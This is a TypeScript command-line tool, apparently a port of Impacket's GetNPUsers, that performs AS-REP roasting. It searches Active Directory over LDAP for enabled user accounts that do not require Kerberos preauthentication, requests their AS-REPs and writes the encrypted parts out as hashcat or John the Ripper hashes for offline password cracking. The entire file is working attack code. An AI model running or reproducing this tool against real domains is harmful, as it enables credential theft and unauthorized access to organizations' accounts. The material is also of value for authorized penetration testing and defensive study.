#!/usr/bin/env node
/**
 * Impacket-js - GetNPUsers
 *
 * Queries target domain for users with 'Do not require Kerberos preauthentication'
 * set (UF_DONT_REQUIRE_PREAUTH) and exports their TGTs for offline cracking
 * (AS-REP roasting).
 *
 * Original technique by @harmj0y.
 * Python implementation by Alberto Solino (@agsolino).
 * TypeScript port.
 */

import { Buffer } from 'node:buffer';
import { readFileSync, writeFileSync } from 'node:fs';
import { parseArgs } from 'node:util';

import {
  parseIdentity,
  init as initLogger,
  info,
  error as logError,
  warning,
  debug as logDebug,
  critical,
  getLevel,
  LogLevel,
  normalizeArgs,
  initProxy,
  BANNER,
} from '@impacket/examples';

import {
  KerberosV5,
  Types,
  Constants,
  Asn1,
  Crypto,
} from '@impacket/krb5';

import {
  LDAPConnection,
  LDAPSessionError,
  LDAPSearchError,
  type SearchResultEntry,
} from '@impacket/ldap';

// ---------- UserAccountControl flags ----------
const UF_ACCOUNTDISABLE = 0x0002;
const UF_DONT_REQUIRE_PREAUTH = 0x400000;

// ---------- helpers ----------

function getUnixTime(t: number): number {
  return (t - 116444736000000000) / 10000000;
}

function printTable(items: string[][], header: string[]): void {
  const colLen = header.map((col, i) => {
    const maxRow = items.reduce((mx, row) => Math.max(mx, (row[i] ?? '').length), 0);
    return Math.max(maxRow, col.length);
  });

  const formatRow = (row: string[]): string =>
    row.map((cell, i) => cell.padEnd(colLen[i]!)).join('  ');

  console.log(formatRow(header));
  console.log(colLen.map((l) => '-'.repeat(l)).join('  '));
  for (const row of items) {
    console.log(formatRow(row));
  }
}

// ---------- main class ----------

type OutputFormat = 'hashcat' | 'john';

interface GetNPUsersOptions {
  outputFile: string | null;
  outputFormat: OutputFormat;
  usersFile: string | null;
  aesKey: string;
  doKerberos: boolean;
  requestTGT: boolean;
  kdcIp: string | null;
  kdcHost: string | null;
  noPass: boolean;
  debug: boolean;
  ts: boolean;
}

class GetUserNoPreAuth {
  private username: string;
  private password: string;
  private domain: string;
  private lmhash = '';
  private nthash = '';
  private noPass: boolean;
  private outputFile: string | null;
  private outputFormat: OutputFormat;
  private usersFile: string | null;
  private aesKey: string;
  private doKerberos: boolean;
  private requestTGT: boolean;
  private kdcIp: string | null;
  private kdcHost: string | null;
  private baseDN: string;

  constructor(
    username: string,
    password: string,
    domain: string,
    lmhash: string,
    nthash: string,
    opts: GetNPUsersOptions,
  ) {
    this.username = username;
    this.password = password;
    this.domain = domain;
    this.lmhash = lmhash;
    this.nthash = nthash;
    this.noPass = opts.noPass;
    this.outputFile = opts.outputFile;
    this.outputFormat = opts.outputFormat;
    this.usersFile = opts.usersFile;
    this.aesKey = opts.aesKey;
    this.doKerberos = opts.doKerberos;
    this.requestTGT = opts.requestTGT;
    this.kdcIp = opts.kdcIp;
    this.kdcHost = opts.kdcHost;

    // Build baseDN from domain
    this.baseDN = domain
      .split('.')
      .map((p) => `dc=${p}`)
      .join(',');
  }

  private async getTGT(userName: string): Promise<string> {
    const clientName = new Types.Principal(
      userName,
      null,
      Constants.PrincipalNameType.NT_PRINCIPAL,
    );

    const upperDomain = this.domain.toUpperCase();

    // Send AS-REQ without preauth (request TGT with RC4 first)
    let supportedCiphers = [Constants.EncryptionTypes.rc4_hmac];

    let tgtResult: KerberosV5.TGTResult;
    try {
      // Build an AS-REQ without preauthentication data
      // We use getKerberosTGT with empty credentials and kerberoastNoPreauth=true
      // to get the AS-REP without decrypting it
      const serverName = new Types.Principal(
        `krbtgt/${upperDomain}`,
        null,
        Constants.PrincipalNameType.NT_PRINCIPAL,
      );

      tgtResult = await KerberosV5.getKerberosTGT(
        clientName,
        '',
        this.domain,
        Buffer.alloc(0),
        Buffer.alloc(0),
        '',
        this.kdcIp,
        true,
        serverName,
        true, // kerberoastNoPreauth - get AS-REP without decrypting
      );
    } catch (e) {
      if (
        e instanceof KerberosV5.KerberosError &&
        e.getErrorCode() === Constants.ErrorCodes.KDC_ERR_ETYPE_NOSUPP
      ) {
        // RC4 not available, ask for AES types
        supportedCiphers = [
          Constants.EncryptionTypes.aes256_cts_hmac_sha1_96,
          Constants.EncryptionTypes.aes128_cts_hmac_sha1_96,
        ];
        // Retry - the getKerberosTGT will handle this internally
        tgtResult = await KerberosV5.getKerberosTGT(
          clientName,
          '',
          this.domain,
          Buffer.alloc(0),
          Buffer.alloc(0),
          '',
          this.kdcIp,
          true,
          undefined,
          true,
        );
      } else if (
        e instanceof KerberosV5.KerberosError &&
        e.getErrorCode() === Constants.ErrorCodes.KDC_ERR_PREAUTH_REQUIRED
      ) {
        // The user DOES require preauth
        throw new Error(`User ${userName} doesn't have UF_DONT_REQUIRE_PREAUTH set`);
      } else {
        throw e;
      }
    }

    // Decode the AS-REP to extract the enc-part cipher
    const asRep = Asn1.AS_REP();
    asRep.decode(tgtResult.tgt);
    const asRepValues = asRep.values;

    const encPart = asRepValues['enc-part'] as Record<string, unknown>;
    const etype = Number(encPart['etype']);
    const cipherBuf = encPart['cipher'] as Buffer;

    if (this.outputFormat === 'john') {
      if (etype === Constants.EncryptionTypes.aes128_cts_hmac_sha1_96 ||
          etype === Constants.EncryptionTypes.aes256_cts_hmac_sha1_96) {
        const data = cipherBuf.subarray(0, -12).toString('hex');
        const checksum = cipherBuf.subarray(-12).toString('hex');
        return `$krb5asrep$${etype}$${upperDomain}${clientName}$${data}$${checksum}`;
      } else {
        const checksum = cipherBuf.subarray(0, 16).toString('hex');
        const data = cipherBuf.subarray(16).toString('hex');
        return `$krb5asrep$${clientName}@${upperDomain}:${checksum}$${data}`;
      }
    } else {
      // hashcat format
      if (etype === Constants.EncryptionTypes.aes128_cts_hmac_sha1_96 ||
          etype === Constants.EncryptionTypes.aes256_cts_hmac_sha1_96) {
        const checksum = cipherBuf.subarray(-12).toString('hex');
        const data = cipherBuf.subarray(0, -12).toString('hex');
        return `$krb5asrep$${etype}$${clientName}$${upperDomain}$${checksum}$${data}`;
      } else {
        const checksum = cipherBuf.subarray(0, 16).toString('hex');
        const data = cipherBuf.subarray(16).toString('hex');
        return `$krb5asrep$${etype}$${clientName}@${upperDomain}:${checksum}$${data}`;
      }
    }
  }

  private outputTGTEntry(entry: string, fd: string[] | null): void {
    console.log(entry);
    if (fd !== null) {
      fd.push(entry);
    }
  }

  async run(): Promise<void> {
    if (this.usersFile) {
      await this.requestUsersFileTGTs();
      return;
    }

    // Are we asked not to supply a password?
    if (!this.doKerberos && this.noPass) {
      info(`Getting TGT for ${this.username}`);
      await this.requestMultipleTGTs([this.username]);
      return;
    }

    // Connect to LDAP
    let ldapConn: LDAPConnection;
    try {
      const ldapUrl = `ldap://${this.domain}`;
      ldapConn = new LDAPConnection({
        url: ldapUrl,
        baseDN: this.baseDN,
        dstIp: this.kdcIp ?? undefined,
        ...(this.doKerberos ? { signing: false } : {}),
      });
      await ldapConn.connect();
      if (this.doKerberos) {
        await ldapConn.kerberosLogin({
          user: this.username,
          password: this.password,
          domain: this.domain,
          lmhash: this.lmhash,
          nthash: this.nthash,
          aesKey: this.aesKey,
          kdcHost: this.kdcHost,
        });
      } else {
        await ldapConn.login({
          user: this.username,
          password: this.password,
          domain: this.domain,
          lmhash: this.lmhash,
          nthash: this.nthash,
        });
      }
    } catch (e) {
      if (e instanceof LDAPSessionError) {
        const errStr = e.getErrorString();
        if (!errStr.includes('strongerAuthRequired')) {
          // Cannot authenticate, try to get this user's TGT (hoping PreAuth is disabled)
          info(`Cannot authenticate ${this.username}, getting its TGT`);
          await this.requestMultipleTGTs([this.username]);
          return;
        }
      }
      throw e;
    }

    // Build search filter: users with UF_DONT_REQUIRE_PREAUTH and not disabled, excluding computers
    const searchFilter =
      `(&(UserAccountControl:1.2.840.113556.1.4.803:=${UF_DONT_REQUIRE_PREAUTH})` +
      `(!(UserAccountControl:1.2.840.113556.1.4.803:=${UF_ACCOUNTDISABLE}))` +
      `(!(objectCategory=computer)))`;

    let resp: SearchResultEntry[];
    try {
      logDebug(`Search Filter=${searchFilter}`);
      resp = await ldapConn.search({
        searchFilter,
        attributes: ['sAMAccountName', 'pwdLastSet', 'MemberOf', 'userAccountControl', 'lastLogon'],
        sizeLimit: 999,
      });
    } catch (e) {
      if (e instanceof LDAPSearchError && e.getErrorString().includes('sizeLimitExceeded')) {
        logDebug('sizeLimitExceeded exception caught, giving up and processing the data received');
        resp = e.getAnswers();
      } else {
        if (e instanceof LDAPSessionError) {
          const errStr = String(e);
          if (errStr.includes('NTLMAuthNegotiate')) {
            critical(
              'NTLM negotiation failed. Probably NTLM is disabled. Try to use Kerberos authentication instead.',
            );
          } else if (this.kdcIp !== null && this.kdcHost !== null) {
            critical(
              'If the credentials are valid, check the hostname and IP address of KDC. They must match exactly each other.',
            );
          }
        }
        throw e;
      }
    }

    // Process results
    type AnswerRow = [string, string, string, string, string];
    const answers: AnswerRow[] = [];
    logDebug(`Total of records returned ${resp.length}`);

    for (const item of resp) {
      let mustCommit = false;
      let sAMAccountName = '';
      let memberOf = '';
      let pwdLastSet = '';
      let userAccountControl = '0';
      let lastLogon = 'N/A';

      try {
        for (const attribute of item.attributes) {
          if (attribute.type === 'sAMAccountName') {
            sAMAccountName = attribute.vals[0]?.toString() ?? '';
            mustCommit = true;
          } else if (attribute.type === 'userAccountControl') {
            const val = parseInt(attribute.vals[0]?.toString() ?? '0', 10);
            userAccountControl = `0x${val.toString(16)}`;
          } else if (attribute.type === 'memberOf') {
            memberOf = attribute.vals[0]?.toString() ?? '';
          } else if (attribute.type === 'pwdLastSet') {
            const val = attribute.vals[0]?.toString() ?? '0';
            if (val === '0') {
              pwdLastSet = '<never>';
            } else {
              const ts = getUnixTime(parseInt(val, 10));
              pwdLastSet = new Date(ts * 1000).toISOString().replace('T', ' ').slice(0, 19);
            }
          } else if (attribute.type === 'lastLogon') {
            const val = attribute.vals[0]?.toString() ?? '0';
            if (val === '0') {
              lastLogon = '<never>';
            } else {
              const ts = getUnixTime(parseInt(val, 10));
              lastLogon = new Date(ts * 1000).toISOString().replace('T', ' ').slice(0, 19);
            }
          }
        }
        if (mustCommit) {
          answers.push([sAMAccountName, memberOf, pwdLastSet, lastLogon, userAccountControl]);
        }
      } catch (e) {
        logError(`Skipping item, cannot process due to error ${String(e)}`);
      }
    }

    if (answers.length > 0) {
      printTable(answers, ['Name', 'MemberOf', 'PasswordLastSet', 'LastLogon', 'UAC']);
      console.log('\n');

      if (this.requestTGT) {
        const usernames = answers.map((row) => row[0]);
        await this.requestMultipleTGTs(usernames);
      }
    } else {
      console.log('No entries found!');
    }

    ldapConn.close();
  }

  private async requestUsersFileTGTs(): Promise<void> {
    const content = readFileSync(this.usersFile!, 'utf-8');
    const usernames = content
      .split('\n')
      .map((l) => l.trim())
      .filter((l) => l.length > 0);
    await this.requestMultipleTGTs(usernames);
  }

  private async requestMultipleTGTs(usernames: string[]): Promise<void> {
    const outputLines: string[] | null = this.outputFile !== null ? [] : null;

    for (const username of usernames) {
      try {
        const entry = await this.getTGT(username);
        this.outputTGTEntry(entry, outputLines);
      } catch (e) {
        logError(String(e));
      }
    }

    if (this.outputFile !== null && outputLines !== null) {
      writeFileSync(this.outputFile, outputLines.join('\n') + '\n');
    }
  }
}

// ---------- CLI ----------

function usage(): never {
  console.log(`Queries target domain for users with 'Do not require Kerberos
preauthentication' set and export their TGTs for cracking

usage: GetNPUsers [-h] [-request] [-outputfile OUTPUTFILE]
                  [-format {hashcat,john}] [-usersfile USERSFILE] [-ts]
                  [-debug] [-hashes LMHASH:NTHASH] [-no-pass] [-k]
                  [-aesKey hex key] [-dc-ip ip address] [-dc-host hostname]
                  target

positional arguments:
  target                [[domain/]username[:password]]

options:
  -h, --help            show this help message and exit
  -request              Requests TGT for users and output them in JtR/hashcat
                        format (default False)
  -outputfile OUTPUTFILE
                        Output filename to write ciphers in JtR/hashcat format
  -format {hashcat,john}
                        format to save the AS_REQ of users without pre-
                        authentication. Default is hashcat
  -usersfile USERSFILE  File with user per line to test
  -ts                   Adds timestamp to every logging output
  -debug                Turn DEBUG output ON

authentication:
  -hashes LMHASH:NTHASH
                        NTLM hashes, format is LMHASH:NTHASH
  -no-pass              don't ask for password (useful for -k)
  -k                    Use Kerberos authentication. Grabs credentials from
                        ccache file (KRB5CCNAME)
  -aesKey hex key       AES key to use for Kerberos Authentication (128 or 256
                        bits)

connection:
  -dc-ip ip address     IP Address of the domain controller. If omitted it
                        uses the domain part (FQDN) specified in the target
                        parameter
  -dc-host hostname     Hostname of the domain controller to use. If omitted,
                        the domain part (FQDN) specified in the account
                        parameter will be used
`);
  process.exit(1);
}

async function main(): Promise<void> {
  const args = normalizeArgs(process.argv.slice(2));

  if (args.length === 0) {
    usage();
  }

  console.log(BANNER + '\n');

  let values: any;
  let positionals: string[];
  try {
    ({ values, positionals } = parseArgs({
      args,
      allowPositionals: true,
      options: {
        request: { type: 'boolean', default: false },
        outputfile: { type: 'string' },
        format: { type: 'string', default: 'hashcat' },
        usersfile: { type: 'string' },
        ts: { type: 'boolean', default: false },
        debug: { type: 'boolean', default: false },
        hashes: { type: 'string' },
        'no-pass': { type: 'boolean', default: false },
        k: { type: 'boolean', default: false },
        aesKey: { type: 'string' },
        'dc-ip': { type: 'string' },
        'dc-host': { type: 'string' },
        proxy: { type: 'string' },
        help: { type: 'boolean', short: 'h', default: false },
      },
    }));
  } catch (e) {
    console.error(`[-] ${(e as Error).message}`);
    usage();
  }

  if (values.help || positionals.length < 1) {
    usage();
  }

  const target = positionals[0]!;

  initLogger({ ts: values.ts, debug: values.debug });
  initProxy(values.proxy);

  const identity = parseIdentity(target, {
    hashes: values.hashes,
    noPass: values['no-pass'],
    aesKey: values.aesKey,
    k: values.k,
  });

  if (identity.domain === '') {
    critical('Domain should be specified!');
    process.exit(1);
  }

  if (
    !identity.doKerberos &&
    values['no-pass'] &&
    identity.username === '' &&
    !values.usersfile
  ) {
    critical(
      'If the -no-pass option was specified, but Kerberos (-k) is not used, ' +
      'then a username or the -usersfile option should be specified!',
    );
    process.exit(1);
  }

  let doRequest = values.request ?? false;
  if (values.outputfile) {
    doRequest = true;
  }

  const formatValue = values.format ?? 'hashcat';
  if (formatValue !== 'hashcat' && formatValue !== 'john') {
    critical(`Invalid format: ${formatValue}. Must be 'hashcat' or 'john'.`);
    process.exit(1);
  }

  const opts: GetNPUsersOptions = {
    outputFile: values.outputfile ?? null,
    outputFormat: formatValue as OutputFormat,
    usersFile: values.usersfile ?? null,
    aesKey: values.aesKey ?? '',
    doKerberos: identity.doKerberos,
    requestTGT: doRequest,
    kdcIp: values['dc-ip'] ?? null,
    kdcHost: values['dc-host'] ?? null,
    noPass: values['no-pass'] ?? false,
    debug: values.debug ?? false,
    ts: values.ts ?? false,
  };

  try {
    const executer = new GetUserNoPreAuth(
      identity.username,
      identity.password,
      identity.domain,
      identity.lmhash,
      identity.nthash,
      opts,
    );
    await executer.run();
  } catch (e) {
    if (getLevel() === LogLevel.DEBUG) {
      console.error(e);
    }
    logError(String(e));
  }
}

main();
